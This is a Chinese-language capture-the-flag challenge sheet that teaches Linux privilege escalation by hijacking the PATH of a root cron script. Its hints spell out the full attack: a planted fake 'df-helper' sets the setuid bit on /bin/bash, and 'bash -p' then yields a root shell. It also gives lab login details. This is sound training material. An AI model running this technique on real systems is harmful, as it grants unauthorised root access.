# 第 4 题：PATH 劫持——root 帮我“引”进了我家

## 场景

这是一台监控服务器。root 每分钟写一份磁盘报告到 `/var/reports/`。
报告脚本 `/usr/local/bin/disk-report.sh` 里调用了一个叫 `df-helper` 的命令——
**很普通的名字**，但你注意到这个脚本设置了自己的 `PATH`。

而你，`player`，拥有一个可写的目录：`/home/player/bin`。

## 目标

拿到 root 权限，读取 `/flag.txt`：

```bash
cat /flag.txt
```

## 登录

```bash
ssh -p 22004 player@<主机IP>
# 密码：Player@2026
```

## 提示

1. 找出 root 自动执行的东西：
   ```bash
   cat /etc/cron.d/*
   cat /usr/local/bin/disk-report.sh
   ```
2. 重点看脚本里的 **PATH** 那一行，顺序是什么？
   ```bash
   echo $PATH
   ```
   `PATH` 是按**从左到右**找命令的。第一个命中的就是你拥有的目录，会发生什么？
3. 你拥有哪些目录的写权限？
   ```bash
   ls -ld /home/player/bin
   ```
4. 脚本里需要 `df-helper`，那你在 `/home/player/bin` 建一个同名文件会怎样？
   ```bash
   cat > /home/player/bin/df-helper <<'EOF'
   #!/bin/bash
   chmod 4755 /bin/bash
   EOF
   chmod +x /home/player/bin/df-helper
   ```
5. 等 1 分钟，确认 `/var/reports/` 有新报告生成后：
   ```bash
   /bin/bash -p
   id
   cat /flag.txt
   ```

## 评分

成功 `cat /flag.txt` 得到 `Ly_Flag{...}` 即为通过。
